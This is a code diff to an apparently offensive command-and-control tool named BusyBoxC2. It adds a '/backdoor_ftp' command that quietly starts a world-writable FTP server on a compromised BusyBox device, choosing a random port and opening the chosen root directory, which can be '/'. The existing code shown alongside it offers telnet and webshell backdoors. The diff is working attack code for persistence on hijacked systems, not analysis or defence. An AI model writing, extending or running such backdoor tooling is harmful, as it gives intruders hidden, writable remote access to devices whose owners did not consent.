@@ -229,6 +229,16 @@ class BusyBoxC2:
         self._send_cmd(cmd)
         print(f"[*] Your telnet backdoor is ready on telnet://{self.server_ip}:{listening_port}")
 
+    def _backdoor_ftp(self):
+        ftp_root = self.prompt_session.prompt("FTP root directory (can be /): ")
+        listening_port = random.randint(1024, 65534)
+        cmd = "setsid tcpsvd -E 0.0.0.0 " + str(listening_port) + " ftpd -wA " + ftp_root
+        #print(cmd)
+        self.options.append('furtive')
+        self._send_cmd(cmd)
+        self.options.remove('furtive')
+        print(f"[*] Your FTP backdoor is ready on ftp://{self.server_ip}:{listening_port}")
+
     def _load_prompt(self):
         agent_user = self._send_cmd("echo $USER", output=False)[0].decode().split("\n", 1)[0]
         #print(agent_user)
@@ -271,6 +281,8 @@ class BusyBoxC2:
                             self._backdoor_webshell()
                         case '/backdoor_telnet':
                             self._backdoor_telnet()
+                        case '/backdoor_ftp':
+                            self._backdoor_ftp()
                         case '/load_prompt':
                             self.options.append('load_prompt')
                             self._load_prompt()
